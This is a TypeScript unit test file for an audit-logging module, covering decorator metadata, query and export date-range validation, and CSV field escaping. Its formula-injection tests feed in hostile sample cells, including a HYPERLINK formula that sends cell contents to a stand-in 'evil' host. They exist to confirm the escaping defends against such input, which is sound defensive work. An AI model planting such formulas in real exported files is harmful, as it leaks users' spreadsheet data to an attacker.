/**
 * Audit unit tests.
 *
 * Covers:
 *   U1 — @Audit decorator sets AUDIT_ACTION_KEY metadata correctly.
 *   U2 — AuditQueryDto clamping / validation (pagination clamp, garbage → 400, page cap #9).
 *   U3 — AuditExportQueryDto: rejects missing date bounds, rejects >31-day range,
 *        DERIVES the missing bound so a one-date export is always ≤31 days (#2).
 *   U4 — escapeCSVField: commas, double-quotes, newlines, nulls, objects.
 *   U5 — escapeCSVField formula-injection neutralisation (#1 BLOCKER).
 */
import 'reflect-metadata';
import { AUDIT_ACTION_KEY, Audit } from './decorators/audit.decorator';
import { AuditQuerySchema, AuditExportQuerySchema } from './dto/audit-query.dto';
import { escapeCSVField } from './audit-query.service';

// ─────────────────────────────────────────────────────────────────────────────
// U1 — @Audit decorator
// ─────────────────────────────────────────────────────────────────────────────
describe('@Audit decorator', () => {
  it('sets AUDIT_ACTION_KEY metadata on the decorated method', () => {
    class TestController {
      @Audit('image.uploaded')
      handler() {}
    }

    const meta = Reflect.getMetadata(AUDIT_ACTION_KEY, TestController.prototype.handler);
    expect(meta).toBe('image.uploaded');
  });

  it('AUDIT_ACTION_KEY is a Symbol', () => {
    expect(typeof AUDIT_ACTION_KEY).toBe('symbol');
  });

  it('does not set metadata on un-decorated methods', () => {
    class TestController {
      noAudit() {}
    }
    const meta = Reflect.getMetadata(AUDIT_ACTION_KEY, TestController.prototype.noAudit);
    expect(meta).toBeUndefined();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// U2 — AuditQueryDto clamping / validation
// ─────────────────────────────────────────────────────────────────────────────
describe('AuditQuerySchema', () => {
  it('applies defaults when no params given', () => {
    const result = AuditQuerySchema.safeParse({});
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.page).toBe(1);
      expect(result.data.pageSize).toBe(20);
    }
  });

  it('accepts valid actorId (UUID)', () => {
    const result = AuditQuerySchema.safeParse({
      actorId: '018e1c2a-3b4d-7e5f-9a0b-1c2d3e4f5a6b',
    });
    expect(result.success).toBe(true);
  });

  it('rejects non-UUID actorId', () => {
    const result = AuditQuerySchema.safeParse({ actorId: 'not-a-uuid' });
    expect(result.success).toBe(false);
  });

  it('clamps pageSize to max 200', () => {
    const result = AuditQuerySchema.safeParse({ pageSize: '9999' });
    expect(result.success).toBe(false);
  });

  it('rejects page beyond the max to bound OFFSET depth (#9)', () => {
    const result = AuditQuerySchema.safeParse({ page: '99999999' });
    expect(result.success).toBe(false);
  });

  it('accepts page at the cap (10000)', () => {
    const result = AuditQuerySchema.safeParse({ page: '10000' });
    expect(result.success).toBe(true);
  });

  it('rejects extra keys (strict mode)', () => {
    const result = AuditQuerySchema.safeParse({ unknownField: 'x' });
    expect(result.success).toBe(false);
  });

  it('coerces string dates', () => {
    const result = AuditQuerySchema.safeParse({
      dateFrom: '2024-01-01T00:00:00Z',
      dateTo: '2024-01-31T23:59:59Z',
    });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.dateFrom).toBeInstanceOf(Date);
      expect(result.data.dateTo).toBeInstanceOf(Date);
    }
  });

  // A date-only `dateTo` (e.g. '2026-06-10') must cover the WHOLE day;
  // dateFrom (lower bound) stays at midnight, which is correct/inclusive.
  it('date-only dateTo covers the whole day (same-day events are NOT dropped)', () => {
    const result = AuditQuerySchema.safeParse({ dateFrom: '2026-06-01', dateTo: '2026-06-10' });
    expect(result.success).toBe(true);
    if (result.success) {
      const sameDay = new Date('2026-06-10T14:00:00Z');
      // An event at 14:00 on the 10th is within [dateFrom, dateTo].
      expect(result.data.dateTo!.getTime()).toBeGreaterThanOrEqual(sameDay.getTime());
      // Lower bound is still the start of the day (midnight) — inclusive.
      expect(result.data.dateFrom!.getTime()).toBe(new Date('2026-06-01T00:00:00.000Z').getTime());
    }
  });

  it('preserves a FULL-TIMESTAMP dateTo exactly (no end-of-day widening)', () => {
    const result = AuditQuerySchema.safeParse({ dateTo: '2026-06-10T09:30:00Z' });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.dateTo!.toISOString()).toBe('2026-06-10T09:30:00.000Z');
    }
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// U3 — AuditExportQueryDto
// ─────────────────────────────────────────────────────────────────────────────
describe('AuditExportQuerySchema', () => {
  it('rejects when neither dateFrom nor dateTo provided', () => {
    const result = AuditExportQuerySchema.safeParse({});
    expect(result.success).toBe(false);
    if (!result.success) {
      const messages = result.error.issues.map((i) => i.message);
      expect(
        messages.some((m) => m.includes('dateFrom') || m.includes('dateTo') || m.includes('bound')),
      ).toBe(true);
    }
  });

  it('accepts when only dateFrom is provided', () => {
    const result = AuditExportQuerySchema.safeParse({ dateFrom: '2024-01-01' });
    expect(result.success).toBe(true);
  });

  it('DERIVES dateTo = dateFrom + 31d when only dateFrom is given — bounded, not full-log (#2)', () => {
    const result = AuditExportQuerySchema.safeParse({ dateFrom: '1970-01-01T00:00:00Z' });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.dateFrom).toBeInstanceOf(Date);
      expect(result.data.dateTo).toBeInstanceOf(Date);
      const diffDays =
        (result.data.dateTo!.getTime() - result.data.dateFrom!.getTime()) / (1000 * 60 * 60 * 24);
      // Exactly the 31-day window — a `?dateFrom=1970-01-01` can NOT export everything.
      expect(diffDays).toBeCloseTo(31, 5);
    }
  });

  it('DERIVES dateFrom = dateTo − 31d when only dateTo is given (#2)', () => {
    const result = AuditExportQuerySchema.safeParse({ dateTo: '2024-12-31T00:00:00Z' });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.dateFrom).toBeInstanceOf(Date);
      expect(result.data.dateTo).toBeInstanceOf(Date);
      const diffDays =
        (result.data.dateTo!.getTime() - result.data.dateFrom!.getTime()) / (1000 * 60 * 60 * 24);
      expect(diffDays).toBeCloseTo(31, 5);
    }
  });

  it('leaves both bounds intact when both are given within the cap', () => {
    const result = AuditExportQuerySchema.safeParse({
      dateFrom: '2024-01-01T00:00:00Z',
      dateTo: '2024-01-15T00:00:00Z',
    });
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.dateFrom!.toISOString()).toBe('2024-01-01T00:00:00.000Z');
      expect(result.data.dateTo!.toISOString()).toBe('2024-01-15T00:00:00.000Z');
    }
  });

  it('rejects when date range exceeds 31 days', () => {
    const result = AuditExportQuerySchema.safeParse({
      dateFrom: '2024-01-01',
      dateTo: '2024-03-01', // > 31 days
    });
    expect(result.success).toBe(false);
    if (!result.success) {
      const messages = result.error.issues.map((i) => i.message);
      expect(messages.some((m) => m.includes('31'))).toBe(true);
    }
  });

  it('accepts a range exactly 31 days', () => {
    const result = AuditExportQuerySchema.safeParse({
      dateFrom: '2024-01-01',
      dateTo: '2024-02-01', // 31 days exactly
    });
    expect(result.success).toBe(true);
  });

  // The export shares the inclusive date-only `dateTo` semantics — a
  // date-only upper bound must cover the WHOLE day.
  it('date-only dateTo covers the whole day in the export window', () => {
    const result = AuditExportQuerySchema.safeParse({
      dateFrom: '2026-06-01',
      dateTo: '2026-06-10',
    });
    expect(result.success).toBe(true);
    if (result.success) {
      const sameDay = new Date('2026-06-10T14:00:00Z');
      expect(result.data.dateTo!.getTime()).toBeGreaterThanOrEqual(sameDay.getTime());
    }
  });

  it('rejects extra keys', () => {
    const result = AuditExportQuerySchema.safeParse({
      dateFrom: '2024-01-01',
      injected: true,
    });
    expect(result.success).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// U4 — escapeCSVField
// ─────────────────────────────────────────────────────────────────────────────
describe('escapeCSVField', () => {
  it('returns empty string for null', () => {
    expect(escapeCSVField(null)).toBe('');
  });

  it('returns empty string for undefined', () => {
    expect(escapeCSVField(undefined)).toBe('');
  });

  it('passes through a plain string unchanged', () => {
    expect(escapeCSVField('hello')).toBe('hello');
  });

  it('wraps and escapes a string containing a comma', () => {
    expect(escapeCSVField('a,b')).toBe('"a,b"');
  });

  it('wraps and doubles embedded double-quotes', () => {
    expect(escapeCSVField('say "hello"')).toBe('"say ""hello"""');
  });

  it('wraps a string containing a newline', () => {
    expect(escapeCSVField('line1\nline2')).toBe('"line1\nline2"');
  });

  it('wraps a string containing a carriage return', () => {
    expect(escapeCSVField('line1\rline2')).toBe('"line1\rline2"');
  });

  it('serialises an object as JSON and wraps if needed', () => {
    const val = { foo: 'bar,baz' };
    const result = escapeCSVField(val);
    // JSON will contain : and a comma → must be quoted
    expect(result.startsWith('"')).toBe(true);
    expect(result).toContain('foo');
  });

  it('handles numbers', () => {
    expect(escapeCSVField(42)).toBe('42');
  });

  it('handles boolean', () => {
    expect(escapeCSVField(true)).toBe('true');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// U5 — escapeCSVField formula-injection neutralisation (#1 BLOCKER)
// ─────────────────────────────────────────────────────────────────────────────
describe('escapeCSVField — formula injection (#1)', () => {
  it('neutralises a leading "=" (HYPERLINK attack) with a prefix quote', () => {
    const ua = '=HYPERLINK("http://evil/?"&A1,"x")';
    const out = escapeCSVField(ua);
    // Must start with the neutralising single-quote. The value also contains
    // commas/quotes, so it is additionally CSV-quoted → starts with `"'`.
    expect(out.startsWith(`"'`)).toBe(true);
    // The cell content (after CSV unwrap) begins with `'=`, not bare `=`.
    expect(out).toContain(`'=HYPERLINK`);
  });

  it('neutralises a leading "+"', () => {
    expect(escapeCSVField('+1234567890')).toBe(`'+1234567890`);
  });

  it('neutralises a leading "-"', () => {
    expect(escapeCSVField('-2+3')).toBe(`'-2+3`);
  });

  it('neutralises a leading "@" (e.g. an @SUM-style payload)', () => {
    // No comma/quote/newline inside → prefixed only, not CSV-quoted.
    expect(escapeCSVField('@SUM(A1:A9)')).toBe(`'@SUM(A1:A9)`);
  });

  it('neutralises a leading "@" AND CSV-quotes when a comma is present', () => {
    expect(escapeCSVField('@SUM(A1,A9)')).toBe(`"'@SUM(A1,A9)"`);
  });

  it('neutralises a leading TAB', () => {
    expect(escapeCSVField('\t=1+1')).toBe(`'\t=1+1`);
  });

  it('neutralises a leading CR (then CSV-quotes for the CR)', () => {
    const out = escapeCSVField('\r=1+1');
    // Leading CR → prefixed with `'`, and the CR forces CSV double-quoting.
    expect(out).toBe(`"'\r=1+1"`);
  });

  it('does NOT alter a normal user-agent string', () => {
    const ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)';
    expect(escapeCSVField(ua)).toBe(ua);
  });

  it('does NOT alter a value with an INTERIOR formula char', () => {
    // Only the LEADING char triggers; an `=` in the middle is harmless.
    expect(escapeCSVField('a=b')).toBe('a=b');
  });

  it('neutralises a changes-JSON whose serialisation could start with a trigger', () => {
    // JSON.stringify of an object starts with `{`, which is safe — but a raw
    // string value passed directly that starts with `=` must be neutralised.
    expect(escapeCSVField('=cmd')).toBe(`'=cmd`);
  });
});
